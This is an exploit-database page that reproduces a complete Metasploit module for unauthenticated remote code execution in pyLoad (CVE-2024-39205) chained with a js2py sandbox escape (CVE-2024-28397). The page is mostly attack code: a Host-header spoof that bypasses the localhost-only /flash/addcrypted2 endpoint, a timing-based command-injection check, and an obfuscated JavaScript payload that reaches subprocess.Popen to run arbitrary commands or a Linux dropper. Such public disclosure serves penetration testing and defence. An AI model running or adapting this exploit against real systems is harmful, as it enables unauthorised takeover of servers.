---
title: Pyload Remote Code Execution
url: https://cxsecurity.com/issue/WLB-2024110031
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2024-11-19
fetch_date: 2025-10-06T19:16:26.813865
---

# Pyload Remote Code Execution

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Pyload Remote Code Execution** **2024.11.18**  Credit:  **[Spencer McIntyre](https://cxsecurity.com/author/Spencer%2BMcIntyre/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2024-28397](https://cxsecurity.com/cveshow/CVE-2024-28397/ "Click to see CVE-2024-28397")** | **[CVE-2024-39205](https://cxsecurity.com/cveshow/CVE-2024-39205/ "Click to see CVE-2024-39205")**  CWE: **N/A** | |

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require 'rex/stopwatch'
class MetasploitModule < Msf::Exploit::Remote
Rank = ExcellentRanking
prepend Msf::Exploit::Remote::AutoCheck
include Msf::Exploit::Remote::HttpClient
include Msf::Exploit::CmdStager
def initialize(info = {})
super(
update\_info(
info,
'Name' => 'Pyload RCE (CVE-2024-39205) with js2py sandbox escape (CVE-2024-28397)',
'Description' => %q{
CVE-2024-28397 is sandbox escape in js2py (<=0.74) which is a popular python package that can evaluate
javascript code inside a python interpreter. The vulnerability allows for an attacker to obtain a reference
to a python object in the js2py environment enabling them to escape the sandbox, bypass pyimport restrictions
and execute arbitrary commands on the host. At the time of writing no patch has been released, version 0.74
is the latest version of js2py which was released Nov 6, 2022.
CVE-2024-39205 is an remote code execution vulnerability in Pyload (<=0.5.0b3.dev85) which is an open-source
download manager designed to automate file downloads from various online sources. Pyload is vulnerable because
it exposes the vulnerable js2py functionality mentioned above on the /flash/addcrypted2 API endpoint.
This endpoint was designed to only accept connections from localhost but by manipulating the HOST header we
can bypass this restriction in order to access the API to achieve unauth RCE.
},
'Author' => [
'Marven11', # PoC
'Spencer McIntyre', # Previous pyLoad module which this is based on
'jheysel-r7' # Metasploit module
],
'References' => [
[ 'CVE', '2024-39205' ],
[ 'CVE', '2024-28397' ],
[ 'URL', 'https://github.com/Marven11/CVE-2024-39205-Pyload-RCE' ],
[ 'URL', 'https://github.com/pyload/pyload/security/advisories/GHSA-w7hq-f2pj-c53g' ],
[ 'URL', 'https://github.com/Marven11/CVE-2024-28397-js2py-Sandbox-Escape' ],
],
'DisclosureDate' => '2024-10-28',
'License' => MSF\_LICENSE,
'Platform' => %w[unix linux],
'Arch' => [ARCH\_CMD, ARCH\_X86, ARCH\_X64],
'Privileged' => true,
'Targets' => [
[
'Unix Command',
{
'Platform' => %w[unix linux],
'Arch' => ARCH\_CMD,
'Type' => :unix\_cmd
}
],
[
'Linux Dropper',
{
'Platform' => 'linux',
'Arch' => [ARCH\_X86, ARCH\_X64],
'Type' => :linux\_dropper
}
],
],
'DefaultTarget' => 0,
'Notes' => {
'Stability' => [CRASH\_SAFE],
'Reliability' => [REPEATABLE\_SESSION],
'SideEffects' => [IOC\_IN\_LOGS, ARTIFACTS\_ON\_DISK]
}
)
)
register\_options([
Opt::RPORT(9666),
OptString.new('TARGETURI', [true, 'Base path', '/'])
])
end
def check
sleep\_time = rand(5..10)
\_, elapsed\_time = Rex::Stopwatch.elapsed\_time do
execute\_command("sleep #{sleep\_time}")
end
vprint\_status("Elapsed time: #{elapsed\_time} seconds")
unless elapsed\_time > sleep\_time
return CheckCode::Safe('Failed to test command injection.')
end
CheckCode::Vulnerable('Successfully tested command injection.')
rescue Msf::Exploit::Failed
return CheckCode::Safe('Failed to test command injection.')
end
def exploit
print\_status("Executing #{target.name} for #{datastore['PAYLOAD']}")
case target['Type']
when :unix\_cmd
if execute\_command(payload.encoded)
print\_good("Successfully executed command: #{payload.encoded}")
end
when :linux\_dropper
execute\_cmdstager
end
end
def javascript\_payload(cmd)
js\_vars = Rex::RandomIdentifier::Generator.new({ language: :javascript })
js = <<~EOS
let #{js\_vars[:command]} = "#{cmd}"
let #{js\_vars[:hacked]}, #{js\_vars[:bymarve]}, #{js\_vars[:n11]}
let #{js\_vars[:getattr]}, #{js\_vars[:obj]}
#{js\_vars[:base]} = '\_\_base\_\_'
#{js\_vars[:getattribute]} = '\_\_getattribute\_\_'
#{js\_vars[:hacked]} = Object.getOwnPropertyNames({})
#{js\_vars[:bymarve]} = #{js\_vars[:hacked]}[#{js\_vars[:getattribute]}]
#{js\_vars[:n11]} = #{js\_vars[:bymarve]}("\_\_getattribute\_\_")
#{js\_vars[:obj]} = #{js\_vars[:n11]}("\_\_class\_\_")[#{js\_vars[:base]}]
#{js\_vars[:getattr]} = #{js\_vars[:obj]}[#{js\_vars[:getattribute]}]
#{js\_vars[:sub\_class]} = '\_\_subclasses\_\_';
function #{js\_vars[:findpopen]}(#{js\_vars[:o]}) {
let #{js\_vars[:result]};
for(let #{js\_vars[:i]} in #{js\_vars[:o]}[#{js\_vars[:sub\_class]}]()) {
let #{js\_vars[:item]} = #{js\_vars[:o]}[#{js\_vars[:sub\_class]}]()[#{js\_vars[:i]}]
if(#{js\_vars[:item]}.\_\_module\_\_ == "subprocess" && #{js\_vars[:item]}.\_\_name\_\_ == "Popen") {
return #{js\_vars[:item]}
}
if(#{js\_vars[:item]}.\_\_name\_\_ != "type" && (#{js\_vars[:result]} = #{js\_vars[:findpopen]}(#{js\_vars[:item]}))) {
return #{js\_vars[:result]}
}
}
}
#{js\_vars[:n11]} = #{js\_vars[:findpopen]}(#{js\_vars[:obj]})(#{js\_vars[:command]}, -1, null, -1, -1, -1, null, null, true).communicate()
EOS
opts = { 'Strings' => true }
js = ::Rex::Exploitation::ObfuscateJS.new(js, opts)
js.obfuscate(memory\_sensitive: true)
js.to\_s
end
def execute\_command(cmd, \_opts = {})
cmd.gsub!(/\\/, '\\\\\\\\')
cmd.gsub!(/"/, '\"')
vprint\_status("Executing command: #{cmd}")
crypted\_b64 = Rex::Text.encode\_base64(rand(4))
res = send\_request\_cgi(
'method' => 'POST',
'headers' => {
'Host' => "127.0.0.1:#{datastore['RPORT']}"
},
'uri' => normalize\_uri(target\_uri.path, 'flash', 'addcrypted2'),
'vars\_post' => {
'crypted' => crypted\_b64,
'jk' => javascript\_payload(cmd)
}
)
# The command will either cause the response to timeout or return a 500
return if res.nil?
return if res.code == 500 && res.get\_xml\_document.xpath('//title').text == 'Sorry, something went wrong... :('
fail\_with(Failure::UnexpectedReply, "The HTTP server replied with a status of #{res.code}")
end
end

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2024110031)

[Tweet](https:/...